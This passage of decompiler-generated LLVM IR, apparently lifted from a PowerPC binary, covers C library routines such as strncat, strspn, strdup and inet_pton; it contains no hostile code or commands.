  br i1 %v4_100130c0, label %dec_label_pc_100130c8, label %dec_label_pc_100130d0

dec_label_pc_100130c8:                            ; preds = %dec_label_pc_100130b8
  ret i32 %v0_100130c8

dec_label_pc_100130d0:                            ; preds = %dec_label_pc_100130b8
  %v2_100130d0 = inttoptr i32 %v1_100130a8 to i8*
  %v3_100130d0 = load i8, i8* %v2_100130d0, align 1
  %v4_100130d0 = zext i8 %v3_100130d0 to i32
  %v4_100130d4 = icmp eq i32 %v4_100130d0, %v0_10013074
  br i1 %v4_100130d4, label %dec_label_pc_100130dc, label %dec_label_pc_100130e4

dec_label_pc_100130dc:                            ; preds = %dec_label_pc_100130d0
  ret i32 %v1_100130a8

dec_label_pc_100130e4:                            ; preds = %dec_label_pc_100130d0
  %v2_100130e4 = inttoptr i32 %v1_10013094 to i8*
  %v3_100130e4 = load i8, i8* %v2_100130e4, align 1
  %v4_100130e4 = zext i8 %v3_100130e4 to i32
  %v4_100130e8 = icmp eq i32 %v4_100130e4, %v0_10013074
  br i1 %v4_100130e8, label %dec_label_pc_100130f0, label %dec_label_pc_100130f8

dec_label_pc_100130f0:                            ; preds = %dec_label_pc_100130e4
  ret i32 %v1_10013094

dec_label_pc_100130f8:                            ; preds = %dec_label_pc_100130e4
  %v2_100130f8 = inttoptr i32 %v1_100130bc to i8*
  %v3_100130f8 = load i8, i8* %v2_100130f8, align 1
  %v4_100130f8 = zext i8 %v3_100130f8 to i32
  %v4_100130fc = icmp eq i32 %v4_100130f8, %v0_10013074
  br i1 %v4_100130fc, label %dec_label_pc_10013104, label %dec_label_pc_1001308c

dec_label_pc_10013104:                            ; preds = %dec_label_pc_100130f8
  ret i32 %v1_100130bc

; uselistorder directives
  uselistorder i32 %v1_10013090, { 1, 0 }
  uselistorder i32 %v0_100130c8, { 0, 1, 3, 2, 6, 5, 4 }
  uselistorder i32 %v2_1001307c, { 1, 0 }
  uselistorder i32 %v0_10013074, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10013068, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1001306c1, { 2, 1, 0 }
  uselistorder i32 %v1_10013054, { 1, 2, 0 }
  uselistorder i32 -2130640640, { 0, 3, 2, 9, 1, 4, 10, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1001305c, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013110

dec_label_pc_10013110:                            ; preds = %dec_label_pc_10013110, %entry
  %v0_10013110 = phi i32 [ %v1_10013114, %dec_label_pc_10013110 ], [ %tmp, %entry ]
  %v1_10013110 = inttoptr i32 %v0_10013110 to i8*
  %v2_10013110 = load i8, i8* %v1_10013110, align 1
  %v1_10013114 = add i32 %v0_10013110, 1
  store i32 %v1_10013114, i32* %r11.global-to-local, align 4
  %v3_10013118 = icmp eq i8 %v2_10013110, 0
  store i1 %v3_10013118, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013118, label %dec_label_pc_10013120, label %dec_label_pc_10013110

dec_label_pc_10013120:                            ; preds = %dec_label_pc_10013110
  %v3_10013120 = icmp eq i32 %arg2, 3
  store i1 %v3_10013120, i1* %cr7_eq.global-to-local, align 1
  %v1_10013124 = add i32 %v0_10013110, -1
  store i32 %v1_10013124, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_100131c0, label %dec_label_pc_10013130

dec_label_pc_10013130:                            ; preds = %dec_label_pc_10013120
  %v1_10013130 = udiv i32 %arg2, 4
  store i32 %v1_10013130, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10013138

dec_label_pc_10013138:                            ; preds = %dec_label_pc_10013138.dec_label_pc_10013138_crit_edge, %dec_label_pc_10013130
  %v2_10013148 = phi i32 [ %v0_1001313c.pre, %dec_label_pc_10013138.dec_label_pc_10013138_crit_edge ], [ %v1_10013124, %dec_label_pc_10013130 ]
  %v0_10013138 = load i32, i32* @r4, align 4
  %v1_10013138 = inttoptr i32 %v0_10013138 to i8*
  %v2_10013138 = load i8, i8* %v1_10013138, align 1
  %v1_1001313c = add i32 %v2_10013148, 1
  store i32 %v1_1001313c, i32* %r9.global-to-local, align 4
  %v1_10013140 = add i32 %v2_10013148, 2
  store i32 %v1_10013140, i32* %r7.global-to-local, align 4
  %v3_10013144 = icmp eq i8 %v2_10013138, 0
  store i1 %v3_10013144, i1* %cr7_eq.global-to-local, align 1
  %v4_10013148 = inttoptr i32 %v1_1001313c to i8*
  store i8 %v2_10013138, i8* %v4_10013148, align 1
  %v0_1001314c = load i32, i32* @r4, align 4
  %v1_1001314c = add i32 %v0_1001314c, 1
  store i32 %v1_1001314c, i32* %r11.global-to-local, align 4
  %v0_10013150 = load i32, i32* @lr, align 4
  %v1_10013150 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013150, i32 %v0_10013150)
  %v0_10013154 = load i32, i32* @r4, align 4
  %v1_10013154 = add i32 %v0_10013154, 1
  %v2_10013154 = inttoptr i32 %v1_10013154 to i8*
  %v3_10013154 = load i8, i8* %v2_10013154, align 1
  %v0_10013158 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013158 = add i32 %v0_10013158, 1
  store i32 %v1_10013158, i32* %r8.global-to-local, align 4
  %v0_1001315c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001315c = add i32 %v0_1001315c, 1
  store i32 %v1_1001315c, i32* %r10.global-to-local, align 4
  %v3_10013160 = icmp eq i8 %v3_10013154, 0
  store i1 %v3_10013160, i1* %cr7_eq.global-to-local, align 1
  %v2_10013164 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013164 = add i32 %v2_10013164, 1
  %v4_10013164 = inttoptr i32 %v3_10013164 to i8*
  store i8 %v3_10013154, i8* %v4_10013164, align 1
  %v0_10013168 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013168 = add i32 %v0_10013168, 1
  store i32 %v1_10013168, i32* %r9.global-to-local, align 4
  %v1_1001316c = add i32 %v0_10013168, 2
  store i32 %v1_1001316c, i32* @r4, align 4
  %v0_10013170 = load i32, i32* @lr, align 4
  %v1_10013170 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013170, i32 %v0_10013170)
  %v0_10013174 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013174 = add i32 %v0_10013174, 1
  %v2_10013174 = inttoptr i32 %v1_10013174 to i8*
  %v3_10013174 = load i8, i8* %v2_10013174, align 1
  %v0_10013178 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013178 = add i32 %v0_10013178, 1
  store i32 %v1_10013178, i32* %r11.global-to-local, align 4
  %v3_1001317c = icmp eq i8 %v3_10013174, 0
  store i1 %v3_1001317c, i1* %cr7_eq.global-to-local, align 1
  %v2_10013180 = load i32, i32* %r7.global-to-local, align 4
  %v3_10013180 = add i32 %v2_10013180, 1
  %v4_10013180 = inttoptr i32 %v3_10013180 to i8*
  store i8 %v3_10013174, i8* %v4_10013180, align 1
  %v0_10013184 = load i32, i32* @lr, align 4
  %v1_10013184 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013184, i32 %v0_10013184)
  %v0_10013188 = load i32, i32* %r8.global-to-local, align 4
  %v1_10013188 = add i32 %v0_10013188, 1
  %v2_10013188 = inttoptr i32 %v1_10013188 to i8*
  %v3_10013188 = load i8, i8* %v2_10013188, align 1
  %v4_10013188 = zext i8 %v3_10013188 to i32
  store i32 %v4_10013188, i32* %r9.global-to-local, align 4
  %v3_1001318c = icmp eq i8 %v3_10013188, 0
  store i1 %v3_1001318c, i1* %cr7_eq.global-to-local, align 1
  %v2_10013190 = load i32, i32* %r10.global-to-local, align 4
  %v3_10013190 = add i32 %v2_10013190, 1
  %v4_10013190 = inttoptr i32 %v3_10013190 to i8*
  store i8 %v3_10013188, i8* %v4_10013190, align 1
  %v0_10013194 = load i32, i32* @lr, align 4
  %v1_10013194 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10013194, i32 %v0_10013194)
  %v0_10013198 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013198 = add i32 %v0_10013198, -1
  store i32 %v1_10013198, i32* %ctr.global-to-local, align 4
  %v2_10013198 = icmp eq i32 %v1_10013198, 0
  br i1 %v2_10013198, label %dec_label_pc_1001319c, label %dec_label_pc_10013138.dec_label_pc_10013138_crit_edge

dec_label_pc_10013138.dec_label_pc_10013138_crit_edge: ; preds = %dec_label_pc_10013138
  %v0_1001313c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10013138

dec_label_pc_1001319c:                            ; preds = %dec_label_pc_10013138
  %v0_1001319c = load i32, i32* %r5.global-to-local, align 4
  %v1_1001319c = urem i32 %v0_1001319c, 4
  store i32 %v1_1001319c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100131c0

dec_label_pc_100131a4:                            ; preds = %dec_label_pc_100131c0, %dec_label_pc_100131a4.dec_label_pc_100131a4_crit_edge
  %v0_100131a8 = phi i32 [ %v0_100131a8.pre, %dec_label_pc_100131a4.dec_label_pc_100131a4_crit_edge ], [ %v0_100131c0, %dec_label_pc_100131c0 ]
  %v0_100131a4 = load i32, i32* @r4, align 4
  %v1_100131a4 = inttoptr i32 %v0_100131a4 to i8*
  %v2_100131a4 = load i8, i8* %v1_100131a4, align 1
  %v3_100131a4 = zext i8 %v2_100131a4 to i32
  store i32 %v3_100131a4, i32* %r9.global-to-local, align 4
  %v1_100131a8 = add i32 %v0_100131a8, -1
  store i32 %v1_100131a8, i32* %r5.global-to-local, align 4
  %v1_100131ac = add i32 %v0_100131a4, 1
  store i32 %v1_100131ac, i32* @r4, align 4
  %v3_100131b0 = icmp eq i8 %v2_100131a4, 0
  store i1 %v3_100131b0, i1* %cr7_eq.global-to-local, align 1
  %v2_100131b4 = load i32, i32* %r11.global-to-local, align 4
  %v3_100131b4 = add i32 %v2_100131b4, 1
  %v4_100131b4 = inttoptr i32 %v3_100131b4 to i8*
  store i8 %v2_100131a4, i8* %v4_100131b4, align 1
  store i32 %v3_100131b4, i32* %r11.global-to-local, align 4
  %v0_100131b8 = load i32, i32* @lr, align 4
  %v1_100131b8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100131b8, i32 %v0_100131b8)
  %v0_100131c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100131c8 = add i32 %v0_100131c8, -1
  store i32 %v1_100131c8, i32* %ctr.global-to-local, align 4
  %v2_100131c8 = icmp eq i32 %v1_100131c8, 0
  br i1 %v2_100131c8, label %dec_label_pc_100131cc, label %dec_label_pc_100131a4.dec_label_pc_100131a4_crit_edge

dec_label_pc_100131a4.dec_label_pc_100131a4_crit_edge: ; preds = %dec_label_pc_100131a4
  %v0_100131a8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100131a4

dec_label_pc_100131c0:                            ; preds = %dec_label_pc_10013120, %dec_label_pc_1001319c
  %v0_100131c0 = phi i32 [ %arg2, %dec_label_pc_10013120 ], [ %v1_1001319c, %dec_label_pc_1001319c ]
  store i32 %v0_100131c0, i32* %ctr.global-to-local, align 4
  %v2_100131c83 = icmp eq i32 %v0_100131c0, 0
  br i1 %v2_100131c83, label %dec_label_pc_100131cc, label %dec_label_pc_100131a4

dec_label_pc_100131cc:                            ; preds = %dec_label_pc_100131a4, %dec_label_pc_100131c0
  %v0_100131cc = load i32, i32* %r9.global-to-local, align 4
  %v3_100131cc = icmp eq i32 %v0_100131cc, 0
  store i1 %v3_100131cc, i1* %cr7_eq.global-to-local, align 1
  %v0_100131d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100131cc, i32 %v0_100131d0)
  %v0_100131d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100131d4 = trunc i32 %v0_100131d4 to i8
  %v2_100131d4 = load i32, i32* %r11.global-to-local, align 4
  %v3_100131d4 = add i32 %v2_100131d4, 1
  %v4_100131d4 = inttoptr i32 %v3_100131d4 to i8*
  store i8 %v1_100131d4, i8* %v4_100131d4, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_100131c0, { 1, 2, 0 }
  uselistorder i32 %v1_100131c8, { 1, 0 }
  uselistorder i32 %v1_1001319c, { 1, 0 }
  uselistorder i32 %v1_10013198, { 1, 0 }
  uselistorder i32 %v2_10013148, { 1, 0 }
  uselistorder i32 %v1_10013114, { 1, 0 }
  uselistorder i32 %v0_10013110, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100131cc, { 1, 0 }
  uselistorder label %dec_label_pc_100131c0, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001320c1 = load i32, i32* @r3, align 4
  %v1_1001320c2 = inttoptr i32 %v0_1001320c1 to i8*
  %v2_1001320c3 = load i8, i8* %v1_1001320c2, align 1
  %v3_100132106 = icmp eq i8 %v2_1001320c3, 0
  br i1 %v3_100132106, label %dec_label_pc_10013220, label %dec_label_pc_10013218

dec_label_pc_100131e8:                            ; preds = %dec_label_pc_100131e8, %dec_label_pc_10013218
  %v0_100131e8 = phi i32 [ %v1_100131ec, %dec_label_pc_100131e8 ], [ %tmp, %dec_label_pc_10013218 ]
  %v1_100131e8 = inttoptr i32 %v0_100131e8 to i8*
  %v2_100131e8 = load i8, i8* %v1_100131e8, align 1
  %v1_100131ec = add i32 %v0_100131e8, 1
  %v3_100131f0 = icmp eq i8 %v2_100131e8, 0
  %v4_100131f4 = icmp eq i8 %v0_100131f48.in, %v2_100131e8
  %brmerge = or i1 %v3_100131f0, %v4_100131f4
  br i1 %brmerge, label %dec_label_pc_100131fc, label %dec_label_pc_100131e8

dec_label_pc_100131fc:                            ; preds = %dec_label_pc_100131e8
  br i1 %v3_100131f0, label %dec_label_pc_10013220, label %dec_label_pc_10013204

dec_label_pc_10013204:                            ; preds = %dec_label_pc_100131fc
  %v1_10013204 = add i32 %v0_10013204, 1
  %v1_10013208 = add i32 %v0_10013208, 1
  %v1_1001320c = inttoptr i32 %v1_10013208 to i8*
  %v2_1001320c = load i8, i8* %v1_1001320c, align 1
  %v3_10013210 = icmp eq i8 %v2_1001320c, 0
  br i1 %v3_10013210, label %dec_label_pc_10013220, label %dec_label_pc_10013218

dec_label_pc_10013218:                            ; preds = %entry, %dec_label_pc_10013204
  %v0_10013208 = phi i32 [ %v1_10013208, %dec_label_pc_10013204 ], [ %v0_1001320c1, %entry ]
  %v0_10013204 = phi i32 [ %v1_10013204, %dec_label_pc_10013204 ], [ 0, %entry ]
  %v0_100131f48.in = phi i8 [ %v2_1001320c, %dec_label_pc_10013204 ], [ %v2_1001320c3, %entry ]
  br label %dec_label_pc_100131e8

dec_label_pc_10013220:                            ; preds = %dec_label_pc_10013204, %dec_label_pc_100131fc, %entry
  %v0_10013220 = phi i32 [ 0, %entry ], [ %v1_10013204, %dec_label_pc_10013204 ], [ %v0_10013204, %dec_label_pc_100131fc ]
  ret i32 %v0_10013220

; uselistorder directives
  uselistorder i32 %v0_100131e8, { 1, 0 }
  uselistorder label %dec_label_pc_10013218, { 1, 0 }
  uselistorder label %dec_label_pc_100131e8, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_1001323c = call i32 @__GI_strlen()
  %v1_10013240 = add i32 %v0_1001323c, 1
  store i32 %v1_10013240, i32* @r29, align 4
  store i32 268513868, i32* @lr, align 4
  %v1_10013248 = call i32 @malloc(i32 %v1_10013240)
  store i32 %v1_10013248, i32* @r3, align 4
  %v0_1001324c = load i32, i32* @r28, align 4
  store i32 %v0_1001324c, i32* @r4, align 4
  store i32 %v1_10013248, i32* @r31, align 4
  %v3_10013250 = icmp eq i32 %v1_10013248, 0
  %v0_10013254 = load i32, i32* @r29, align 4
  store i32 %v0_10013254, i32* @r5, align 4
  br i1 %v3_10013250, label %dec_label_pc_10013260, label %dec_label_pc_1001325c

dec_label_pc_1001325c:                            ; preds = %entry
  store i32 268513888, i32* @lr, align 4
  %v0_1001325c = call i32 @memcpy()
  %v0_10013264.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013260

dec_label_pc_10013260:                            ; preds = %entry, %dec_label_pc_1001325c
  %v0_10013264 = phi i32 [ 0, %entry ], [ %v0_10013264.pre, %dec_label_pc_1001325c ]
  ret i32 %v0_10013264

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 6, 1, 0, 3, 2, 11, 7, 10, 9, 8, 5, 4 }
  uselistorder label %dec_label_pc_10013260, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10013278 = load i32, i32* @lr, align 4
  store i32 %v0_10013278, i32* %r0.global-to-local, align 4
  %v0_10013280 = call i32 @__asm_mfcr()
  store i32 %v0_10013280, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1001328c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001328c, i32* %r7.global-to-local, align 4
  %v0_10013290 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100132f8

dec_label_pc_100132a8:                            ; preds = %dec_label_pc_100132f8
  %v3_100132a8 = icmp eq i32 %v0_1001331c, 4
  store i1 %v3_100132a8, i1* %cr7_eq.global-to-local, align 1
  %v0_100132ac = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_100132ac, label %dec_label_pc_100132e4, label %dec_label_pc_100132b0

dec_label_pc_100132b0:                            ; preds = %dec_label_pc_100132a8
  %v0_100132b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_100132b0 = inttoptr i32 %v0_100132b0 to i8*
  %v2_100132b0 = load i8, i8* %v1_100132b0, align 1
  %v3_100132b0 = zext i8 %v2_100132b0 to i32
  %v1_100132b4 = mul nuw nsw i32 %v3_100132b0, 10
  %v1_100132b8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100132b8 = add i32 %v1_100132b4, %v1_100132b8
  %v1_100132bc = add i32 %v2_100132b8, -48
  store i32 %v1_100132bc, i32* %r0.global-to-local, align 4
  %v2_100132c0 = icmp ugt i32 %v1_100132bc, 255
  %v3_100132c0 = icmp eq i32 %v1_100132bc, 255
  store i1 %v3_100132c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100132c0, label %dec_label_pc_10013340, label %dec_label_pc_100132c8

dec_label_pc_100132c8:                            ; preds = %dec_label_pc_100132b0
  %v1_100132c8 = trunc i32 %v1_100132bc to i8
  store i8 %v1_100132c8, i8* %v1_100132b0, align 1
  %v0_100132cc = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_100132cc, label %dec_label_pc_100132d0, label %dec_label_pc_100132f8.backedge

dec_label_pc_100132d0:                            ; preds = %dec_label_pc_100132c8
  %v0_100132d0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100132d0 = add i32 %v0_100132d0, 1
  store i32 %v1_100132d0, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_100132d8 = icmp sgt i32 %v1_100132d0, 4
  %v3_100132d8 = icmp eq i32 %v1_100132d0, 4
  store i1 %v3_100132d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100132d8, label %dec_label_pc_10013340, label %dec_label_pc_100132f8.backedge

dec_label_pc_100132e4:                            ; preds = %dec_label_pc_100132a8
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_100132e8 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_100132e8.not = xor i1 %v0_100132e8, true
  %v0_100132ec = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_100132a8, %v0_100132ec
  %or.cond = or i1 %brmerge, %v0_100132e8.not
  br i1 %or.cond, label %dec_label_pc_10013340, label %dec_label_pc_100132f4

dec_label_pc_100132f4:                            ; preds = %dec_label_pc_100132e4
  %v0_100132f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_100132f4 = trunc i32 %v0_100132f4 to i8
  %v2_100132f4 = load i32, i32* %r7.global-to-local, align 4
  %v3_100132f4 = add i32 %v2_100132f4, 1
  %v4_100132f4 = inttoptr i32 %v3_100132f4 to i8*
  store i8 %v1_100132f4, i8* %v4_100132f4, align 1
  store i32 %v3_100132f4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100132f8.backedge

dec_label_pc_100132f8.backedge:                   ; preds = %dec_label_pc_100132f4, %dec_label_pc_100132c8, %dec_label_pc_100132d0
  %v0_100132f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100132fc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100132f8

dec_label_pc_100132f8:                            ; preds = %dec_label_pc_100132f8.backedge, %entry
  %v0_100132fc = phi i32 [ %v0_100132fc.pre, %dec_label_pc_100132f8.backedge ], [ 0, %entry ]
  %v0_10013300 = phi i32 [ %v0_100132f8.pre, %dec_label_pc_100132f8.backedge ], [ %v0_10013280, %entry ]
  %v1_100132f8 = inttoptr i32 %v0_10013300 to i8*
  %v2_100132f8 = load i8, i8* %v1_100132f8, align 1
  %v3_100132f8 = zext i8 %v2_100132f8 to i32
  store i32 %v3_100132f8, i32* %r11.global-to-local, align 4
  %v3_100132fc = icmp eq i32 %v0_100132fc, 0
  store i1 %v3_100132fc, i1* %cr4_eq.global-to-local, align 1
  %v1_10013300 = add i32 %v0_10013300, 1
  store i32 %v1_10013300, i32* %r3.global-to-local, align 4
  %v3_10013304 = icmp eq i8 %v2_100132f8, 0
  store i1 %v3_10013304, i1* %cr7_eq.global-to-local, align 1
  %v1_10013308 = add nsw i32 %v3_100132f8, -48
  store i32 %v1_10013308, i32* %r0.global-to-local, align 4
  %v2_1001330c = icmp ugt i32 %v1_10013308, 9
  store i1 %v2_1001330c, i1* %cr6_gt.global-to-local, align 1
  %v3_10013310 = icmp eq i8 %v2_100132f8, 46
  store i1 %v3_10013310, i1* %cr1_eq.global-to-local, align 1
  %v0_10013314 = load i4, i4* @cr4, align 1
  %v1_10013314 = call %2 @__asm_mcrf_cr0_write(i4 %v0_10013314)
  %v4_10013314 = extractvalue %2 %v1_10013314, 2
  store i1 %v4_10013314, i1* %cr0_eq.global-to-local, align 1
  %v0_10013318 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1001331c = load i32, i32* %r10.global-to-local, align 4
  br i1 %v0_10013318, label %dec_label_pc_1001331c, label %dec_label_pc_100132a8

dec_label_pc_1001331c:                            ; preds = %dec_label_pc_100132f8
  %v3_1001331c = icmp eq i32 %v0_1001331c, 3
  store i1 %v3_1001331c, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1001331c, 4
  br i1 %tmp9, label %dec_label_pc_10013340, label %dec_label_pc_10013324

dec_label_pc_10013324:                            ; preds = %dec_label_pc_1001331c
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1001328c, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013334.841 to i32), i32* @lr, align 4
  %v0_10013330 = call i32 @memcpy()
  br label %dec_label_pc_10013340

dec_label_pc_10013340:                            ; preds = %dec_label_pc_100132e4, %dec_label_pc_100132b0, %dec_label_pc_100132d0, %dec_label_pc_1001331c, %dec_label_pc_10013324
  %storemerge = phi i32 [ 1, %dec_label_pc_10013324 ], [ 0, %dec_label_pc_1001331c ], [ 0, %dec_label_pc_100132d0 ], [ 0, %dec_label_pc_100132b0 ], [ 0, %dec_label_pc_100132e4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_10013290, i32* %r0.global-to-local, align 4
  %v1_10013350 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10013280)
  %v4_10013350 = extractvalue %1 %v1_10013350, 2
  store i1 %v4_10013350, i1* %cr0_eq.global-to-local, align 1
  %v9_10013350 = extractvalue %1 %v1_10013350, 7
  store i4 %v9_10013350, i4* @cr4, align 1
  %v0_10013354 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10013354

; uselistorder directives
  uselistorder i32 %v1_100132d0, { 1, 0, 2 }
  uselistorder i32 %v1_100132bc, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10013280, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 3, 2 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 7, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10013340, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_100132f8.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_10013358 = icmp eq i32 %arg1, 2
  %v0_1001335c = load i32, i32* @lr, align 4
  store i32 %v0_1001335c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_10013358, label %dec_label_pc_10013384, label %dec_label_pc_10013378

dec_label_pc_10013378:                            ; preds = %entry
  %v3_10013378 = icmp eq i32 %arg1, 10
  br i1 %v3_10013378, label %dec_label_pc_10013398, label %dec_label_pc_10013534

dec_label_pc_10013384:                            ; preds = %entry
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268514192, i32* @lr, align 4
  %v3_1001338c = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  store i32 %v3_1001338c, i32* %r3.global-to-local, align 4
  store i32 %v3_1001338c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001354c

dec_label_pc_10013398:                            ; preds = %dec_label_pc_10013378
  %v2_10013398 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013398, i32* %r3.global-to-local, align 4
  store i32 268514216, i32* @lr, align 4
  %v3_100133a4 = call i32 @__GI_memset(i32 %v2_10013398, i32 0, i32 16)
  store i32 %v3_100133a4, i32* %r3.global-to-local, align 4
  %v0_100133a8 = load i32, i32* @r29, align 4
  %v1_100133a8 = inttoptr i32 %v0_100133a8 to i8*
  %v2_100133a8 = load i8, i8* %v1_100133a8, align 1
  %v3_100133a8 = zext i8 %v2_100133a8 to i32
  store i32 %v3_100133a8, i32* %r0.global-to-local, align 4
  store i32 %v3_100133a4, i32* @r31, align 4
  %v2_100133b0 = add i32 %v3_100133a4, 16
  store i32 %v2_100133b0, i32* @r27, align 4
  %v3_100133b4 = icmp eq i8 %v2_100133a8, 58
  br i1 %v3_100133b4, label %dec_label_pc_100133bc, label %dec_label_pc_100133c8

dec_label_pc_100133bc:                            ; preds = %dec_label_pc_10013398
